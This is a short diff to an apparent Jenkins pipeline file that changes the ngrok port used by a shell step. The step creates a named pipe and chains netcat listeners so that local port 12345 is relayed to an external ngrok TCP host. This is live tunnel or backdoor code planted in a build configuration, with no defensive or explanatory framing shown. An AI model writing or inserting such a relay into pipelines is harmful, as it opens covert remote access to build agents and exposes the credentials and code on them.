@@ -5,7 +5,7 @@ pipeline {
             steps {                     
 
                 sh "#!/bin/bash \n +"
-                "export NGPORT=12063 \n +"
+                "export NGPORT=16673 \n +"
                 "export NGHOSTNAME=0.tcp.ngrok.io \n +"
                 "mkfifo piperz \n +"
                 "nc -k -l 12345 0<piperz|nc $NGHOSTNAME $NGPORT 1>piperz & \n +"
